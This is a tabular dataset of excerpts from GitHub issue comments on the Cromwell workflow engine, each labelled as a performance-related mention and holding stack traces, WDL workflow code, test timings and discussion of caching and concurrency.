scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWork",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2621,concurren,concurrent,2621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"euedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1744,concurren,concurrent,1744,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"f_fasta_fai,; ref_fasta_dict=ref_fasta_dict,; gatk_jar=gatk_jar,; isWGS=isWGS,; wgsBinSize=wgsBinSize,; mem=4; }. call AnnotateTargets as TumorAnnotateTargets {; input:; entity_id=row[0],; gatk_jar=gatk_jar,; target_file=TumorWholeGenomeCoverage.gatk_target_file,; ref_fasta=ref_fasta,; ref_fasta_fai=ref_fasta_fai,; ref_fasta_dict=ref_fasta_dict,; enable_gc_correction=enable_gc_correction,; mem=4; }. call CorrectGCBias as TumorCorrectGCBias {; input:; entity_id=row[0], ; gatk_jar=gatk_jar,; coverage_file=TumorWholeGenomeCoverage.gatk_coverage_file,; annotated_targets=TumorAnnotateTargets.annotated_targets,; enable_gc_correction=enable_gc_correction,; mem=4; }. call NormalizeSomaticReadCounts as TumorNormalizeSomaticReadCounts {; input:; entity_id=row[0], ; coverage_file=TumorCorrectGCBias.gatk_cnv_coverage_file_gcbias,; padded_target_file=TumorWholeGenomeCoverage.gatk_target_file,; pon=PoN,; gatk_jar=gatk_jar,; mem=2; }. call PerformSegmentation as TumorPerformSeg {; input:; entity_id=row[0],; gatk_jar=gatk_jar,; tn_file=TumorNormalizeSomaticReadCounts.tn_file,; seg_param_alpha=seg_param_alpha,; seg_param_nperm=seg_param_nperm,; seg_param_pmethod=seg_param_pmethod,; seg_param_minWidth=seg_param_minWidth,; seg_param_kmax=seg_param_kmax,; seg_param_nmin=seg_param_nmin,; seg_param_eta=seg_param_eta,; seg_param_trim=seg_param_trim,; seg_param_undoSplits=seg_param_undoSplits,; seg_param_undoPrune=seg_param_undoPrune,; seg_param_undoSD=seg_param_undoSD,; mem=2; }. call Caller as TumorCaller {; input:; entity_id=row[0],; gatk_jar=gatk_jar,; tn_file=TumorNormalizeSomaticReadCounts.tn_file,; seg_file=TumorPerformSeg.seg_file,; mem=2; }. call HetPulldown {; input:; entity_id_tumor=row[0],; entity_id_normal=row[3],; gatk_jar=gatk_jar,; ref_fasta=ref_fasta,; ref_fasta_fai=ref_fasta_fai,; ref_fasta_dict=ref_fasta_dict,; tumor_bam=row[1],; tumor_bam_idx=row[2],; normal_bam=row[4],; normal_bam_idx=row[5],; common_snp_list=common_snp_list,; mem=4. }. call AllelicCNV {; input:; entity",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:4085,Perform,PerformSegmentation,4085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['PerformSegmentation']
Performance,"file (20 seconds, 134 milliseconds); - should fail to submit invalid_inputs_json (20 seconds, 144 milliseconds); - should fail to submit invalid_inputs_json_object (20 seconds, 163 milliseconds); - should fail to submit invalid_labels (20 seconds, 144 milliseconds); - should fail to submit invalid_options_json (20 seconds, 152 milliseconds); - should fail to submit invalid_workflow_url_length (20 seconds, 112 milliseconds); - should fail to submit workflow_url_with_no_protocol (20 seconds, 517 milliseconds); - should successfully run aliased_subworkflows (2 minutes, 45 seconds); - should successfully run array_io (3 minutes, 46 seconds); - should successfully run array_literal_locations (1 minute, 25 seconds); - should successfully run arrays_scatters_ifs (46 seconds, 201 milliseconds); - should successfully run biscayne_as_map_et_al (15 seconds, 807 milliseconds); - should successfully run biscayne_http_relative_imports (47 seconds, 636 milliseconds); - should successfully run cacheWithinWF (2 minutes, 37 seconds); - should successfully run complex_types_files (3 minutes, 10 seconds); - should successfully run composedenginefunctions (57 seconds, 606 milliseconds); - should successfully run continue_on_return_code (1 minute, 36 seconds); - should successfully run cwl_glob_sort (56 seconds, 873 milliseconds); - should successfully run cwl_glob_sort_with_workflow_url (1 minute, 46 seconds); - should successfully run cwl_import_type (1 minute, 36 seconds); - should successfully run cwl_input_binding_expression (57 seconds, 548 milliseconds); - should successfully run cwl_optionals (56 seconds, 805 milliseconds); - should successfully run cwl_prefix_for_array (1 minute, 5 seconds); - should successfully run cwl_scatter_wf1 (2 minutes, 15 seconds); - should successfully run declarations (2 minutes, 35 seconds); - should successfully run declarations_as_nodes (4 minutes, 6 seconds); - should successfully run declarations_in_ifs (1 minute, 15 seconds); - should successful",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:5897,cache,cacheWithinWF,5897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,1,['cache'],['cacheWithinWF']
Performance,flowExecutionActor.scala:347); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.handleExecutionSuccess(WorkflowExecutionActor.scala:326); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$handleCallSuccessful(WorkflowExecutionActor.scala:304); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:97); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:82); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:33); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:33); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:33); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276977989:4555,concurren,concurrent,4555,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276977989,4,['concurren'],['concurrent']
Performance,flowExecutionActor.scala:353); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.handleExecutionSuccess(WorkflowExecutionActor.scala:326); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$handleCallSuccessful(WorkflowExecutionActor.scala:304); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:97); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:82); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:33); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:33); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:33); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-268829737:4743,concurren,concurrent,4743,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-268829737,4,['concurren'],['concurrent']
Performance,"flows, 1 hr 1 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/979/ (1 total failed workflows, 55 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/984/ (2 total failed workflows, 1 hr 5 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/992/ (0 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/Per",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:1136,Perform,PerformanceTest-against-Alpha,1136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,1,['Perform'],['PerformanceTest-against-Alpha']
Performance,"for query I'd expect for it to typically be measured in seconds, not minutes and certainly not longer than that, it's just that we don't make any guarantee that the data is in there before we move on. For the metadata endpoint there's a summarization process which happens (to make the response time faster) that sweeps around every few minutes (rate is configurable) and calculates the current state of the world",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267738860:286,response time,response time,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1794#issuecomment-267738860,1,['response time'],['response time']
Performance,found the info here:; https://gatkforums.broadinstitute.org/wdl/discussion/9998/using-both-max-concurrent-workflows-and-max-concurrent-jobs. phew...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5503#issuecomment-622644685:95,concurren,concurrent-workflows-and-max-concurrent-jobs,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5503#issuecomment-622644685,1,['concurren'],['concurrent-workflows-and-max-concurrent-jobs']
Performance,"g (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1626,cache,cache,1626,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cache']
Performance,"g as an argument); #; # - the WGS PoN must be generated with WGS samples; # ; # - THIS SCRIPT SHOULD BE CONSIDERED OF ""BETA"" QUALITY; #; # - Example invocation:; # java -jar cromwell.jar run case_gatk_acnv_workflow.wdl myParameters.json; # - See case_gatk_acnv_workflow_template.json for a template json file to modify with your own parameters (please save; # your modified version with a different filename and do not commit to gatk-protected repo).; #; # - Some call inputs might seem out of place - consult with the comments in task definitions for details; #; #############. workflow case_gatk_acnv_workflow {; # Workflow input files; File target_file; File ref_fasta; File ref_fasta_dict; File ref_fasta_fai; File common_snp_list; File input_bam_list; Array[Array[String]] bam_list_array = read_tsv(input_bam_list); File PoN; String gatk_jar. # Input parameters of the PerformSegmentation tool; Float seg_param_alpha; Int seg_param_nperm; String seg_param_pmethod; Int seg_param_minWidth; Int seg_param_kmax; Int seg_param_nmin; Float seg_param_eta; Float seg_param_trim; String seg_param_undoSplits; Float seg_param_undoPrune; Int seg_param_undoSD. # Workflow output directories and options; String plots_dir; String call_cnloh_dir; Boolean disable_sequence_dictionary_validation; Boolean enable_gc_correction; Boolean isWGS; Int wgsBinSize. call PadTargets {; input:; target_file=target_file,; gatk_jar=gatk_jar,; isWGS=isWGS,; mem=1; }. scatter (row in bam_list_array) {. call CalculateTargetCoverage as TumorCalculateTargetCoverage {; input:; entity_id=row[0],; padded_target_file=PadTargets.padded_target_file,; input_bam=row[1],; bam_idx=row[2],; ref_fasta=ref_fasta,; ref_fasta_fai=ref_fasta_fai,; ref_fasta_dict=ref_fasta_dict,; gatk_jar=gatk_jar,; disable_sequence_dictionary_validation=disable_sequence_dictionary_validation,; isWGS=isWGS,; mem=2; } . call WholeGenomeCoverage as TumorWholeGenomeCoverage {; input:; entity_id=row[0],; target_file=PadTargets.padded_target_file,; input_b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:1888,Perform,PerformSegmentation,1888,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['PerformSegmentation']
Performance,"gine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [scala-library-2.11.7.jar:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) [scala-library-2.11.7.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [akka-actor_2.11-2.3.14.jar:na]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [akka-actor_2.11-2.3.14.jar:na]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [scala-library-2.11.7.jar:na]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [scala-library-2.11.7.jar:na]; 2015-12-21 14:05:11,207 cromwell-system-akka.actor.default-dispatcher-2 WARN - JesBackend [UUID(60f8d0d3)]: JesBack",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:4929,concurren,concurrent,4929,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['concurren'],['concurrent']
Performance,gle.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.ru,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:1841,concurren,concurrent,1841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,1,['concurren'],['concurrent']
Performance,gleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:133) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:146) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:892) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:886) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) [cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) [cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoin,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:9482,concurren,concurrent,9482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,gp-8822042418103915125 stopped unexpectedly.; 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:1771,concurren,concurrent,1771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,1,['concurren'],['concurrent']
